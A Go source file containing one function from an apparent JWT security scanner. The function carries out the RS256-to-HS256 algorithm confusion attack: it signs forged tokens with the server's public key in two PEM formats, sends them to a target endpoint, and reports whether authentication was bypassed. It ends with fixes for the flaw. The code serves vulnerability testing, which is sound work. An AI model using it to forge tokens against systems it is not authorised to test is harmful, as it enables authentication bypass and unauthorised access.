package main

import (
	"encoding/json"
	"fmt"
	"log"
)

// testAlgConfusion tests the RS256→HS256 algorithm confusion / key confusion attack.
// FIX: Now tries both SPKI and PKCS1 PEM formats for key matching.
// FIX: Proper error handling for JSON operations.
func testAlgConfusion(cfg *Config) {
	pubKey, err := loadPublicKeyFromFile(cfg.PubKeyFile)
	if err != nil {
		log.Fatalf("Failed to load public key: %v", err)
	}

	header, _, _, err := decodeTokenParts(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to decode token: %v", err)
	}

	// Determine payload encoding
	var payloadB64 string
	if cfg.ModifiedClaims != "" {
		var modified map[string]interface{}
		if err := json.Unmarshal([]byte(cfg.ModifiedClaims), &modified); err != nil {
			log.Fatalf("Failed to parse modified claims: %v", err)
		}
		payloadB64, err = encodeTokenPart(modified)
		if err != nil {
			log.Fatalf("Failed to encode modified payload: %v", err)
		}
	} else {
		payloadB64, err = getPayloadBase64(cfg.Token)
		if err != nil {
			log.Fatalf("Failed to extract payload: %v", err)
		}
	}

	// Try multiple PEM formats since the server may store the key in either format.
	// The HMAC key must be byte-for-byte identical to what the server uses.
	pemVariants := []struct {
		name string
		key  string
	}{
		{"SPKI (BEGIN PUBLIC KEY)", ""},
		{"PKCS1 (BEGIN RSA PUBLIC KEY)", ""},
	}
	pemVariants[0].key, _ = publicKeyToPEM(pubKey)
	pemVariants[1].key, _ = publicKeyToPKCS1PEM(pubKey)

	report := Report{}
	found := false

	for _, pv := range pemVariants {
		if pv.key == "" {
			continue
		}

		// Copy header and switch algorithm to HS256
		headerCopy := make(map[string]interface{})
		for k, v := range header {
			headerCopy[k] = v
		}
		headerCopy["alg"] = "HS256"
		delete(headerCopy, "jwk")
		delete(headerCopy, "jku")
		delete(headerCopy, "x5c")
		delete(headerCopy, "x5u")

		forged, err := constructHmacJWTWithRawPayload(headerCopy, payloadB64, []byte(pv.key), "HS256")
		if err != nil {
			continue
		}

		if cfg.Endpoint == "" {
			fmt.Printf("[%s] Forged confusion token: %s\n", pv.name, forged)
			addResult(&report, newResult(
				fmt.Sprintf("RS256→HS256 confusion (%s, offline)", pv.name),
				"Algorithm",
				"CRITICAL",
				fmt.Sprintf("Generated algorithm confusion token using %s PEM format as HMAC key. "+
					"If the server reads 'alg' from token header and uses the RSA public key "+
					"for HMAC verification, this token will be accepted.", pv.name),
			))
			report.Logs = append(report.Logs, forged)
			found = true
		} else {
			accepted, status, body := sendTokenAndCheck(cfg, forged)
			if accepted {
				fmt.Printf("[VULNERABLE] Algorithm confusion accepted (%s)! Status: %d\n", pv.name, status)
				addResult(&report, newResult(
					fmt.Sprintf("RS256→HS256 confusion (%s, confirmed)", pv.name),
					"Algorithm",
					"CRITICAL",
					fmt.Sprintf("Server accepted HS256 token signed with RSA public key (%s format). "+
						"Authentication bypass confirmed.", pv.name),
				))
				bodyPreview := body
				if len(bodyPreview) > 200 {
					bodyPreview = bodyPreview[:200]
				}
				report.Logs = append(report.Logs, "Token: "+forged+" | Response: "+bodyPreview)
				found = true
				break
			} else {
				fmt.Printf("[SAFE] %s confusion rejected (status %d)\n", pv.name, status)
			}
		}
	}

	if !found {
		if cfg.Endpoint != "" {
			addResult(&report, newResult(
				"Algorithm confusion (not vulnerable)",
				"Algorithm",
				"INFO",
				"All PEM format confusion tokens were rejected by the server",
			))
		}
		report.Logs = append(report.Logs, "Algorithm confusion not successful")
	}

	report.Recommendations = append(report.Recommendations,
		"Explicitly specify algorithm whitelist in verify(): algorithms=['RS256']",
		"Never read algorithm from token header to decide verification logic",
		"Separate HMAC keys from RSA public keys in storage",
		"Use libraries that enforce algorithm-key type matching (e.g., PyJWT >= 2.4.0)",
	)
	writeReport(cfg.ReportFile, report)
}
